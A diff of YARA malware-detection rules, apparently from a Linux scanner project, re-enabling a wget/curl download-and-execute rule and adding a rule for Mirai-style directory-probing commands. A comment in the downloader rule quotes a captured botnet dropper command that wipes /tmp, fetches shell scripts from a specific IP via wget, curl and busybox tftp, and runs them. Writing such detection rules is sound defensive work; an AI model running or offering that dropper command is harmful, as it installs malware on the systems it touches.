@@ -129,17 +129,21 @@ rule Hacktool_LoginBrute {
   condition:
     any of them
 }
-// rule OSCommand_WgetAndCurl_Downloader {
-//   meta:
-//     description = "Bash commands to download and execute binaries using CURL || Wget"
-//     author = "Nong Hoang Tu"
-//     date = "12/11/2021"
-//     target = "File, process's cmd, memory"
-//   strings:
-//     $re1 = /wget([ \S])+[ ]+||[ ]+curl([ \S])+\-O([ \S])+[; ]+chmod([ \S])+\+x([ \S\*])+[; ]+/
-//   condition:
-//     all of them
-// }
+
+rule OSCommand_WgetAndCurl_Downloader {
+  meta:
+    description = "Bash commands to download and execute binaries using CURL || Wget"
+    author = "Nong Hoang Tu"
+    date = "12/11/2021"
+    target = "File, process's cmd, memory"
+    hash = "16bbeec4e23c0dc04c2507ec0d257bf97cfdd025cd86f8faf912cea824b2a5ba"
+    hash = "b34bb82ef2a0f3d02b93ed069fee717bd1f9ed9832e2d51b0b2642cb0b4f3891"
+    // Tested target cd /tmp && rm -rf * && wget http://194.87.138.40/BootzIV.sh || curl -O http://194.87.138.40/BootzIV.sh && chmod 777 BootzIV.sh && ./BootzIV.sh && busybox tftp 194.87.138.40 -c get tftp1.sh && chmod 777 tftp1.sh && ./tftp1.sh && busybox tftp -r tftp2.sh -g 194.87.138.40 && chmod 777 tftp2.sh && ./tftp2.sh && rm -rf BootzIV.sh tftp1.sh tftp2.sh
+  strings:
+    $re1 = /wget([ \S])+[; |]+curl([ \S]+)\-O([ \S])+[ |]+[&|; ]+chmod[&|; \d\w\.]+\//
+  condition:
+    all of them
+}
 
 // rule OSCommand_Syslog_Removal {
 //   meta:
@@ -233,6 +237,17 @@ rule FakeDynamicSymbols_Tenable {
     )
 }
 
+rule OSCommand_TryCD {
+  meta:
+    author = "Nong Hoang Tu"
+    email = "dmknght@parrotsec.org"
+    date = "15/11/2021"
+    description = "Bash command to try cd common directories used by Mirai variants"
+  strings:
+    $ = "echo \"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;"
+  condition:
+    all of them
+}
 // rule SuspiciousEnvironmentVariable {
 //   // Malicious exports:
 //   //  export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s
